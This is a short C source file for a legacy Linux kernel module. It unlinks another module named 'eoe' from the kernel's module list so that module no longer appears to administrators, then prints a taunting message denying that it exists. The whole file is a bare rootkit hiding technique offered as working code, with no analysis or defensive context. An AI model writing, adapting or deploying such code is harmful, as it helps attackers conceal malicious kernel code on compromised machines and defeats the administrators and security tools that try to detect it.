#define __KERNEL__
#define MODULE
#include <linux/module.h>
#include <linux/kernel.h>
#include <sys/syscall.h>
#include <linux/unistd.h>
#include <linux/sched.h>
#include <asm/uaccess.h>
#include <linux/mm.h>
#include <linux/smp_lock.h>
#ifndef NULL
#define NULL ((void*)0)
#endif

#define TO_HIDE "eoe"

int init_module()
{
   	int i = 0;
        struct module *m = &__this_module, *lastm = NULL,
	              *to_delete = NULL;
	
        EXPORT_NO_SYMBOLS;
        lastm = m;
        while (m) {
                if (strcmp(m->name, TO_HIDE) == 0) 
                   	lastm->next = m->next;
                lastm = m;   	
                m = m->next;
        }
        printk("I'm so sorry, there exists no module '%s'.\n", TO_HIDE);
        return 0;
}

int cleanup_module()
{
   	return 0;
}

